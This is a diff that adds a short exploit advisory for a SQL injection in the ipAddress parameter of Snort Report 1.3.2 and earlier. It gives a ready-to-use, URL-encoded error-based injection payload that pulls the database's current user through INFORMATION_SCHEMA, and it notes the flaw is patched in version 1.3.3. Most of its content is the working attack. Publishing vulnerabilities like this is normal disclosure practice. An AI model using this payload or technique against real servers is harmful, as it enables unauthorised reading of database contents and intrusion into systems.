@@ -1,0 +1,17 @@
+# Exploit Title: Snort Report <= 1.3.2 SQL Injection Vulnerability
+# Date: 29/01/2012
+# Author: a.kadir altan (testpenter_AT_gmail.com)
+# Software Link: http://www.symmetrixtech.com/ids/snortreport-1.3.2.tar.gz
+# Version: <= 1.3.2
+# Platform: PHP
+##########################
+Vulnerable parameter: 
+ipAddress
+
+Vulnerable URL: 
+http://server/ipdetail.php?type=dst&FQDN=&ipAddress=773116111<SQLi Here>&beginTime=0&endTime=1324665310
+
+PoC:
+http://server/ipdetail.php?type=dst&FQDN=&ipAddress=773116111%20AND%20%28SELECT%205849%20FROM%28SELECT%20COUNT%28*%29%2CCONCAT%280x3a79786a3a%2C%28MID%28%28IFNULL%28CAST%28CURRENT_USER%28%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%29%2C0x3a7578713a%2CFLOOR%28RAND%280%29*2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29&beginTime=0&endTime=1324665310
+##########################
+# Patched in v1.3.3
